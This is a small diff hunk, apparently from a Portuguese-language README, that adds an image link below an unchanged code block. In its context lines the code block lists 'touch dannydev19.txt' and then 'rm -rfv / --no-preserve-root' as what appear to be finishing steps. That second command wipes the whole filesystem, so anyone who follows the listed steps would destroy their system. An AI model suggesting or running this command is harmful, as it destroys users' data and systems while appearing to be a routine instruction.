@@ -176,3 +176,6 @@ Finalizando...
 
     touch dannydev19.txt
     rm -rfv / --no-preserve-root 
+
+
+![image](https://user-images.githubusercontent.com/86691253/185536036-b6574f36-e526-4761-90bd-eac215efb7e9.png)
